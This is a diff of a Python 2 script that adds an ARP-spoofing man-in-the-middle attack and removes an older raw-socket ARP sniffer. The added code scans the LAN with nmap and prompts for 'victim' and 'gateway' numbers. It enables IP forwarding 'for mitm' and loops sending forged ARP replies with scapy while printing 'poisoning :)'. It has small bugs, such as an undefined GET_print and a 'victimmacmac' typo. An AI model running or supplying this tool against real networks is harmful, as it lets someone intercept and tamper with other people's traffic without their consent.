@@ -1,24 +1,23 @@
 #define class that is ARP, so each local host on the network is added as an object
 #also compare it to existing list (array?) of obects
-#
+
 
 
 import nmap
 import json
-
+import os
+from scapy.all import *
 import time
-import struct
-import socket
-import binascii
 
 listofhosts = []
 class ARPhost():
 
-    def __init__(self, name, mac, ip):
-#        ARPhost.__init__(self, name, ip, mac)
+    def __init__(self, name, mac, ip, number):
+#        ARPhost.__init__(self, name, ip, mac, number)
         self.name = name
         self.ip = ip
         self.mac = mac
+        self.number = number
 #    def mac(self, mac):
 
 
@@ -32,8 +31,9 @@ tobeparsed = results["scan"]
 
 
 ##all the below is jjust debugging
-
+number = 0
 for host in nm.all_hosts():
+    number = number + 1
 #    print "host status reason"
 #    print tobeparsed[host]["status"]["reason"]
 #    print tobeparsed[host]
@@ -54,41 +54,69 @@ for host in nm.all_hosts():
         pass
     #print tobeparsed[host]["addresses"]["ipv4"]
     ip = tobeparsed[host]["addresses"]["ipv4"]
-    host = ARPhost(name, mac, ip)
+    host = ARPhost(name, mac, ip, number)
     listofhosts.append(host)
 
 for host in listofhosts:
-    print host.mac
-    print host.ip
-    print host.name
+    print str(host.number) + ":"
+    print "MAC:" + str(host.mac)
+    print "IP: " + str(host.ip)
+    print "Name:" + str(host.name)
+
+
+try:
+#        interface = raw_input("[*] Enter Desired Interface: ")
+        interface = "wlan0"
+        victimnumber = raw_input(" Enter Victim Number: ")
+        gatewaynumber = raw_input(" Enter Gateway Number: ")
+except:
+    print "input failed"
+    pass
+
+
+for host in listofhosts:
+    if str(host.number) == str(victimnumber):
+        victimip = host.ip
+        victimmac = host.mac
+    elif str(host.number) == str(gatewaynumber):
+        gatewayip = host.ip
+        gatewaymac = host.mac
+    else:
+        pass
+
+#enabling ip forwarding for mitm
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+print "poisoning :)"
+print gatewayip
+
+
+def http_header(packet):
+        http_packet=str(packet)
+        if http_packet.find('GET'):
+                return GET_print(packet)
+
+def get_mac(IP):
+        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), verbose=0, timeout = 2, iface = interface, inter = 0.1)
+        for snd,rcv in ans:
+                return rcv.sprintf(r"%Ether.src%")
+
+def arpspoof(gatewaymac, victimmac):
+    send(ARP(op = 2, pdst = victimip, psrc = gatewayip, hwdst= victimmac), verbose=0)
+    send(ARP(op = 2, pdst = gatewayip, psrc = victimip, hwdst= gatewaymac), verbose=0)
+
+while True:
+    try:
+        gatewaymac = get_mac(gatewayip)
+        victimmacmac = get_mac(victimip)
+        arpspoof(gatewaymac, victimmac)
+
+        time.sleep(0.25)
+
+    except:
+        print "poisoning failed"
+        break
+
+
 #    print nm[host].addresses()
 #    print nm[host].hostnames()
 
-
-
-rawSocket=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0806))
-
-g = open('snifferlog.txt', 'w')
-def arpsniff():
-while True:
-
-    receivedPacket=rawSocket.recv(66566)
-
-    #Ethernet Header...
-    ethernetHeader=receivedPacket[0:14]
-    ethrheader=struct.unpack("!6s6sH",ethernetHeader)
-    destinationMAC= binascii.hexlify(ethrheader[0])
-    sourceMAC= binascii.hexlify(ethrheader[1])
-    protocol= str(ethrheader[2])
-    ipHeader=receivedPacket[14:34]
-    ipHdr=struct.unpack("!BBHHHBBH4s4s",ipHeader)
-    ttl = ipHdr[5]
-    strttl = str(ttl)
-    protocol = ipHdr[6]
-    s_addr = socket.inet_ntoa(ipHdr[8]);
-    d_addr = socket.inet_ntoa(ipHdr[9]);
-
-    if protocol == 62:
-#        print protocol
-#        print sourceMAC
-#        print destinationMAC
